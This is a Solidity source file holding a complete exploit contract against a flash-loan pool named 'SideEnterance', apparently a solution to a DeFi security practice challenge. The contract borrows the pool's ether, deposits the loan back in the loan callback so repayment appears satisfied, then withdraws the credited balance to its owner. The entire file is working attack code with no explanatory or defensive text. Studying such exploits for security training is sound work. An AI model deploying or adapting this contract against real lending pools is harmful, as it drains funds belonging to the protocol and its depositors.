// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface SideEnteranceInterface {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

contract ExploitSideEnterance {
    address public owner;
    SideEnteranceInterface victimContract;
    uint256 public amountToExploit;

    constructor(address _victim){
        owner = msg.sender;
        victimContract = SideEnteranceInterface(_victim);
    }

    function exploit(uint256 _amount) public {
        require(msg.sender == owner);

        amountToExploit = _amount;
        victimContract.flashLoan(_amount);
        victimContract.withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }

    function execute() external payable {
        victimContract.deposit{value: amountToExploit}();
    }

    receive() external payable{}
}